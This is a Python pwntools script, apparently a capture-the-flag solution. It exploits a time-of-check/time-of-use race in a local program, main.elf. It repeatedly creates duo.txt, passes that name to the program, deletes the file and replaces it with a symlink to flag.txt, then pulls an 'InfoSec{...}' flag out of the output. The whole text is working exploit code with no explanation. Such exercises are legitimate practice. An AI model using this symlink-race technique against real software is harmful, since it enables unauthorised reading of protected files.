#!/usr/bin/env python3
from pwn import *
import re

flag_reg = re.compile("(InfoSec{.+[^}]})")

exist = 0
delete = 0
if os.path.isfile("duo.txt"):
    exist = 1
    
if exist == 1:
    os.remove("duo.txt")

num_seed = 100
num_iteration = 15000
for i in range(10000):
    process_ = process("./main.elf")

    process_.sendline(str(num_seed)) 
    process_.sendline(str(num_iteration)) 


    # create file
    open("duo.txt", "x")
    
    #send file name
    process_.sendline("duo.txt")

    #delete file
    os.remove("duo.txt")
    
    #create symlink
    os.symlink( 'flag.txt', 'duo.txt' )

    all_terminal = process_.recvall().decode("utf-8")

    flag = flag_reg.findall(all_terminal)

    flag = ''.join(flag)  # list to string
    if flag != "":
        break
   
    #delete file 
    if delete == 0:   
      os.remove("duo.txt")

#Print the flag
print(flag)




